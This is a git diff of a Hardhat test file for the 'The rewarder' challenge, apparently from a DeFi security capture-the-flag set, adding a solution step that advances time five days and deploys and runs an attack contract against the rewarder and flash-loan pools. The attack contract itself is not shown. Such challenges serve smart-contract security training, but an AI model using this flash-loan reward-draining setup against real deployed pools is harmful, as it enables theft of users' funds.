@@ -68,8 +68,12 @@ describe('[Challenge] The rewarder', function () {
         expect(await rewarderPool.roundNumber()).to.be.eq(2);
     });
 
-    it('Execution', async function () {
+    it('Execution Rewarder', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const AttackContractFactory = await ethers.getContractFactory('AttackContractRewarder', player);
+        attackContract = await AttackContractFactory.deploy(rewarderPool.address, flashLoanPool.address, liquidityToken.address, rewardToken.address);
+        await attackContract.connect(player).solveChallenge();
     });
 
     after(async function () {
